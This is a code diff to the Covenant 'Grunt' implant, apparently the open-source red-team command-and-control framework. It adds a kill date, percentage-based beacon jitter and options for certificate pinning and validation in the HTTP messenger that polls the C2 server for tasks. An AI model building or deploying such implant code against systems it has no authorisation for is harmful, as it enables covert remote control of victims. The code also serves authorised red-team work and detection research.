@@ -23,8 +23,9 @@ namespace GruntExecutor
                 string CovenantURI = @"{{REPLACE_COVENANT_URI}}";
                 string CovenantCertHash = @"{{REPLACE_COVENANT_CERT_HASH}}";
                 int Delay = Convert.ToInt32(@"{{REPLACE_DELAY}}");
-                int Jitter = Convert.ToInt32(@"{{REPLACE_JITTER}}");
+                int Jitter = Convert.ToInt32(@"{{REPLACE_JITTER_PERCENT}}");
                 int ConnectAttempts = Convert.ToInt32(@"{{REPLACE_CONNECT_ATTEMPTS}}");
+                DateTime KillDate = DateTime.FromBinary(long.Parse(@"{{REPLACE_KILL_DATE}}"));
 				List<string> ProfileHttpHeaderNames = new List<string>();
                 List<string> ProfileHttpHeaderValues = new List<string>();
                 // {{REPLACE_PROFILE_HTTP_HEADERS}}
@@ -35,6 +36,8 @@ namespace GruntExecutor
 				string ProfileHttpGetResponse = @"{{REPLACE_PROFILE_HTTP_GET_RESPONSE}}";
 				string ProfileHttpPostRequest = @"{{REPLACE_PROFILE_HTTP_POST_REQUEST}}";
 				string ProfileHttpPostResponse = @"{{REPLACE_PROFILE_HTTP_POST_RESPONSE}}";
+                bool ValidateCert = bool.Parse(@"{{REPLACE_VALIDATE_CERT}}");
+                bool UseCertPinning = bool.Parse(@"{{REPLACE_USE_CERT_PINNING}}");
 
                 string Hostname = Dns.GetHostName();
                 string IPAddress = Dns.GetHostAddresses(Hostname)[0].ToString();
@@ -72,7 +75,7 @@ namespace GruntExecutor
                 }
                 else
                 {
-                    baseMessenger = new HttpMessenger(CovenantURI, CovenantCertHash, ProfileHttpHeaderNames, ProfileHttpHeaderValues, ProfileHttpUrls, ProfileHttpCookies);
+                    baseMessenger = new HttpMessenger(CovenantURI, CovenantCertHash, UseCertPinning, ValidateCert, ProfileHttpHeaderNames, ProfileHttpHeaderValues, ProfileHttpUrls, ProfileHttpCookies);
                     baseMessenger.Read();
                 }
                 baseMessenger.Identifier = GUID;
@@ -98,7 +101,9 @@ namespace GruntExecutor
                 bool alive = true;
                 while (alive)
                 {
-                    Thread.Sleep((Delay + rnd.Next(Jitter)) * 1000);
+                    int change = rnd.Next((int)Math.Round(Delay * (Jitter / 100.00)));
+                    if (rnd.Next(2) == 0) { change = -change; }
+                    Thread.Sleep((Delay + change) * 1000);
                     try
                     {
                         GruntTaskingMessage message = messenger.ReadTaskingMessage();
@@ -193,6 +198,7 @@ namespace GruntExecutor
                         Console.Error.WriteLine("Loop Exception: " + e.GetType().ToString() + " " + e.Message + Environment.NewLine + e.StackTrace);
                     }
                     if (ConnectAttemptCount >= ConnectAttempts) { return; }
+                    if (KillDate.CompareTo(DateTime.Now) < 0) { return; }
                 }
             }
             catch (Exception e) {
@@ -572,9 +578,12 @@ namespace GruntExecutor
         private List<string> ProfileHttpUrls { get; }
         private List<string> ProfileHttpCookies { get; }
 
+        private bool UseCertPinning { get; set; }
+        private bool ValidateCert { get; set; }
+
         private string ToReadValue { get; set; } = "";
 
-        public HttpMessenger(string CovenantURI, string CovenantCertHash, List<string> ProfileHttpHeaderNames, List<string> ProfileHttpHeaderValues, List<string> ProfileHttpUrls, List<string> ProfileHttpCookies)
+        public HttpMessenger(string CovenantURI, string CovenantCertHash, bool UseCertPinning, bool ValidateCert, List<string> ProfileHttpHeaderNames, List<string> ProfileHttpHeaderValues, List<string> ProfileHttpUrls, List<string> ProfileHttpCookies)
         {
             this.CovenantURI = CovenantURI;
             this.Hostname = CovenantURI.Split(':')[1].Split('/')[2];
@@ -587,14 +596,24 @@ namespace GruntExecutor
             this.CovenantClient.UseDefaultCredentials = true;
             this.CovenantClient.Proxy = WebRequest.DefaultWebProxy;
             this.CovenantClient.Proxy.Credentials = CredentialCache.DefaultNetworkCredentials;
-            if (CovenantCertHash != "")
+
+            this.UseCertPinning = UseCertPinning;
+            this.ValidateCert = ValidateCert;
+
+            ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls;
+            ServicePointManager.ServerCertificateValidationCallback = (sender, cert, chain, errors) =>
             {
-                ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls;
-                ServicePointManager.ServerCertificateValidationCallback = (sender, cert, chain, errors) =>
+                bool valid = true;
+                if (this.UseCertPinning && CovenantCertHash != "")
                 {
-                    return cert.GetCertHashString() == CovenantCertHash;
-                };
-            }
+                    valid = cert.GetCertHashString() == CovenantCertHash;
+                }
+                if (valid && this.ValidateCert)
+                {
+                    valid = errors == System.Net.Security.SslPolicyErrors.None;
+                }
+                return valid;
+            };
         }
 
         public string Read()
